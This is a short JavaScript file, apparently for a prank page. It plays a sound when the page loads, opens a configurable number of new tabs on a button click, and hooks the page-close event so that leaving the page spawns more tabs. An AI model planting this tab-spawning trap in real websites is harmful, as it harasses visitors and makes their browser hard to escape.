var theSound = new Audio(audiosource); //defines our sound

function spawnNewTabs() {
	if (devMode === false) { //listens for devMode var in UserVars
		for (var a = 0; a < numNewTabs; a++) { //number of tabs
			window.open(newTabLink, "_blank"); //opens new tabs
		}
	}
}

function buttonTabs() {
	spawnNewTabs();
	theSound.play();
}

window.onbeforeunload = spawnNewTabs; //spawns tabs before closing page
window.onload = theSound.play(); //plays audio on tab spawn